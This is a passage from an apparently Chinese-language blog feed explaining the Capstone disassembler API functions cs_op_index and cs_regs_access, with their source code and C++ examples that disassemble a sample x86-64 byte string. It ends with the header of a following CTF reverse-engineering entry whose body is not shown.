class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出<br><img src="https://i.loli.net/2019/07/27/5d3c32814f9e736661.jpg" alt></p><h3 id="cs-op-index"><a href="#cs-op-index" class="headerlink" title="cs_op_index"></a>cs_op_index</h3><p><code>int CAPSTONE_API cs_op_index(csh handle, const cs_insn *insn, unsigned int op_type, unsigned int position);</code></p><p>检索给定类型的操作数在<code>&lt;arch&gt;.operands[]</code>数组中的位置, 使用返回的位置访问操作数。<br>注意：只有当detail选项为ON时这个API可用 (默认OFF).</p><p>handle: cs_open()返回的句柄<br>insn: 从cs_disasm()或cs_disasm_iter()接收的反汇编指令结构<br>op_type: 要找到的操作数类型。<br>position: 要查找的操作数的位置。范围一定在<code>[1, cs_op_count(handle, insn, op_type)]</code>内<br>return: 指令insn的<code>&lt;arch&gt;.operands[]</code>数组中给定类型op_type的操作数的索引，失败时返回-1。</p><p>代码实现</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> CAPSTONE_API <span class="title">cs_op_index</span><span class="params">(csh ud, <span class="keyword">const</span> cs_insn *insn, <span class="keyword">unsigned</span> <span class="keyword">int</span> op_type,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">unsigned</span> <span class="keyword">int</span> post)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">handle</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> count = <span class="number">0</span>, i;</span><br><span class="line"><span class="keyword">if</span> (!ud)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">handle = (struct cs_struct *)(<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!handle-&gt;detail) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_DETAIL;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!insn-&gt;id) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_SKIPDATA;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!insn-&gt;detail) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_DETAIL;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle-&gt;errnum = CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (handle-&gt;arch) &#123;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">handle-&gt;errnum = CS_ERR_HANDLE;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_ARM:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;arm.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;arm.operands[i].type == (arm_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_ARM64:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;arm64.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;arm64.operands[i].type == (arm64_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_X86:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;x86.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;x86.operands[i].type == (x86_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_MIPS:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;mips.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;mips.operands[i].type == (mips_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_PPC:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;ppc.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;ppc.operands[i].type == (ppc_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_SPARC:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;sparc.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;sparc.operands[i].type == (sparc_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_SYSZ:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;sysz.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;sysz.operands[i].type == (sysz_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_XCORE:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;xcore.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;xcore.operands[i].type == (xcore_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_M68K:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;m68k.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;m68k.operands[i].type == (m68k_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_TMS320C64X:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;tms320c64x.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;tms320c64x.operands[i].type == (tms320c64x_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_M680X:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;m680x.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;m680x.operands[i].type == (m680x_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE64 <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00\xe9\xea\xbe\xad\xde\xff\x25\x23\x01\x00\x00\xe8\xdf\xbe\xad\xde\x74\xff"</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[] = &#123;</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_64,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE64,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE64) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 64 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">csh handle;</span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line">cs_insn* insn;</span><br><span class="line">cs_detail* detail;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">cs_x86* x86;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, &amp;handle);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line">cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);</span><br><span class="line"></span><br><span class="line">insn = cs_malloc(handle);</span><br><span class="line">x86 = &amp;(insn-&gt;detail-&gt;x86);</span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x1000</span>;</span><br><span class="line">code = platforms[i].code;</span><br><span class="line">size = platforms[i].size;</span><br><span class="line"><span class="keyword">while</span> (cs_disasm_iter(handle, &amp;code, &amp;size, &amp;address, insn)) &#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s          "</span>,</span><br><span class="line">insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">count = cs_op_count(handle, insn, X86_OP_IMM);  <span class="comment">//查找立即数</span></span><br><span class="line"><span class="keyword">if</span> (count) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\timm_count: %u\n"</span>, count);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; count + <span class="number">1</span>; i++) &#123;</span><br><span class="line"><span class="keyword">int</span> index = cs_op_index(handle, insn, X86_OP_IMM, i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\timms[%u]: 0x%"</span> PRIx64 <span class="string">"\n"</span>, i, x86-&gt;operands[index].imm);</span><br><span class="line"><span class="keyword">if</span> (x86-&gt;encoding.imm_offset != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\timm_offset: 0x%x\n"</span>, x86-&gt;encoding.imm_offset);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (x86-&gt;encoding.imm_size != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\timm_size: 0x%x\n"</span>, x86-&gt;encoding.imm_size);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">cs_free(insn, <span class="number">1</span>);</span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出<br><img src="https://i.loli.net/2019/07/27/5d3c45bfef22464773.jpg" alt></p><h3 id="cs-regs-access"><a href="#cs-regs-access" class="headerlink" title="cs_regs_access"></a>cs_regs_access</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">cs_err CAPSTONE_API <span class="title">cs_regs_access</span><span class="params">(csh handle, <span class="keyword">const</span> cs_insn *insn,</span></span></span><br><span class="line"><span class="function"><span class="params">cs_regs regs_read, <span class="keyword">uint8_t</span> *regs_read_count,</span></span></span><br><span class="line"><span class="function"><span class="params">cs_regs regs_write, <span class="keyword">uint8_t</span> *regs_write_count)</span></span>;</span><br></pre></td></tr></table></figure><p>检索由一条指令显式或隐式访问的所有寄存器。</p><p>注意： 在“diet”模式下，此API不可用，因为引擎不存储寄存器。</p><p>handle: cs_open()返回的句柄<br>insn: 从cs_disasm()或cs_disasm_iter()返回的反汇编指令结构<br>regs_read:返回时，这个数组包含所有按指令读取的寄存器。<br>regs_read_count:保存在regs_read数组中的寄存器数。<br>regs_write:返回时，这个数组包含所有由指令修改的寄存器。<br>regs_write_count:保存在regs_write数组中的寄存器数。<br>成功时返回CS_ERR_OK，失败时返回其他值(详细错误请参阅cs_err enum)。</p><p>代码实现</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">cs_err CAPSTONE_API <span class="title">cs_regs_access</span><span class="params">(csh ud, <span class="keyword">const</span> cs_insn *insn,</span></span></span><br><span class="line"><span class="function"><span class="params">cs_regs regs_read, <span class="keyword">uint8_t</span> *regs_read_count,</span></span></span><br><span class="line"><span class="function"><span class="params">cs_regs regs_write, <span class="keyword">uint8_t</span> *regs_write_count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">handle</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ud)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">handle = (struct cs_struct *)(<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_DIET</span></span><br><span class="line"><span class="comment">// This API does not work in DIET mode</span></span><br><span class="line">handle-&gt;errnum = CS_ERR_DIET;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_DIET;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">if</span> (!handle-&gt;detail) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_DETAIL;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_DETAIL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!insn-&gt;id) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_SKIPDATA;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_SKIPDATA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!insn-&gt;detail) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_DETAIL;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_DETAIL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;reg_access) &#123;</span><br><span class="line">handle-&gt;reg_access(insn, regs_read, regs_read_count, regs_write, regs_write_count);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// this arch is unsupported yet</span></span><br><span class="line">handle-&gt;errnum = CS_ERR_ARCH;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_ARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE64 <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00\xe9\xea\xbe\xad\xde\xff\x25\x23\x01\x00\x00\xe8\xdf\xbe\xad\xde\x74\xff"</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[] = &#123;</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_64,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE64,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE64) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 64 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">csh handle;</span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line">cs_insn* insn;</span><br><span class="line">cs_detail* detail;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">cs_x86* x86;</span><br><span class="line">cs_regs regs_read, regs_write;</span><br><span class="line"><span class="keyword">uint8_t</span> regs_read_count, regs_write_count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, &amp;handle);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line">cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);</span><br><span class="line"></span><br><span class="line">insn = cs_malloc(handle);</span><br><span class="line">x86 = &amp;(insn-&gt;detail-&gt;x86);</span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x1000</span>;</span><br><span class="line">code = platforms[i].code;</span><br><span class="line">size = platforms[i].size;</span><br><span class="line"><span class="keyword">while</span> (cs_disasm_iter(handle, &amp;code, &amp;size, &amp;address, insn)) &#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s          "</span>,</span><br><span class="line">insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!cs_regs_access(handle, insn,       <span class="comment">//每条指令所有读取和修改的寄存器</span></span><br><span class="line">regs_read, &amp;regs_read_count,</span><br><span class="line">regs_write, &amp;regs_write_count)) &#123;</span><br><span class="line"><span class="keyword">if</span> (regs_read_count) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\tRegisters read:"</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; regs_read_count; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %s"</span>, cs_reg_name(handle, regs_read[i]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (regs_write_count) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\tRegisters modified:"</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; regs_write_count; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %s"</span>, cs_reg_name(handle, regs_write[i]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">cs_free(insn, <span class="number">1</span>);</span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出<br><img src="https://i.loli.net/2019/07/27/5d3c48d04fea172636.jpg" alt></p><p>From <a href="https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(四">https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(四)/</a>/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Capstone反汇编引擎数据类型及API分析及示例-四&quot;&gt;&lt;a href=&quot;#Capstone反汇编引擎数据类型及API分析及示例-四&quot; class=&quot;headerlink&quot; title=&quot;Capstone反汇编引擎数据类型及API分析及示例(四)&quot;&gt;&lt;/a&gt;C
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="反汇编" scheme="https://kabeor.github.io/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>SICNU-CTF逆向 Sign</title>
    <link href="https://kabeor.github.io/SICNU-CTF%E9%80%86%E5%90%91%20Sign/"/>
    <id>https://kabeor.github.io/SICNU-CTF逆向 Sign/</id>
    <published>2019-07-26T04:27:46.431Z</published>
    <updated>2019-07-26T04:35:11.665Z</updated>
    
